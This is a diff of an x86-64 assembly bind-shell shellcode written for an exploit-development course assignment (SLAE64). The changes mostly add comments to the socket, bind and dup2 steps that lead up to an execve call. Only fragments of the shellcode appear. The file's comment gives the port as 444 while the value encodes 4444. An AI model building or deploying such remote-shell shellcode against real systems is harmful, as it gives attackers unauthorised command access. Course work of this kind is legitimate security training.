@@ -3,6 +3,8 @@
 ; SLAE64 Assignment #1: Shell_Bind_TCP
 ; =====================================
 ;
+; This version has been coded without code optimization and without removing NULLs.
+;
 ; Compile: 
 ;   nasm -f elf64 BindShell-Execve-Stack.nasm -o BindShell-Execve-Stack.o 
 ; Link: Use the -N option, to  access memory positions in the .text 
@@ -12,7 +14,7 @@
 %define AF_INET 2
 %define SOCK_STREAM 1
 %define INADDR_ANY 0
-%define PORT 0x5c11				; Port 444 (htons(4444))
+%define PORT 0x5c11			; Port 444 (htons(4444))
 
 global _start
 
@@ -39,6 +41,7 @@ real_start:
 
 	; Prepare (struct sockaddr *)&server
 	;	RSP will point to the struct address
+	;       Values of the struct into the stack
 	
 	xor rax, rax
 	push rax			; bzero(&server.sin_zero, 8)
@@ -48,6 +51,7 @@ real_start:
 	mov word [rsp - 8], AF_INET
 
 	sub rsp, 8 			; Update RSP with right value
+	                                ;  to point to the *&server struct
 	
 	; bind(sock, (struct sockaddr *)&server, sockaddr_len)
 	;	RDI already has the sock_id
@@ -95,15 +99,15 @@ real_start:
 	mov rdi, rbx			; Client socket descriptor
 
 	mov rax, 33			; syscall number
-	mov rsi, 0
+	mov rsi, 0                      ; stdin
 	syscall
 
 	mov rax, 33
-	mov rsi, 1
+	mov rsi, 1                      ; stdout
 	syscall
 
 	mov rax, 33
-	mov rsi, 2
+	mov rsi, 2                      ; stderr
 	syscall
 
 	; execve
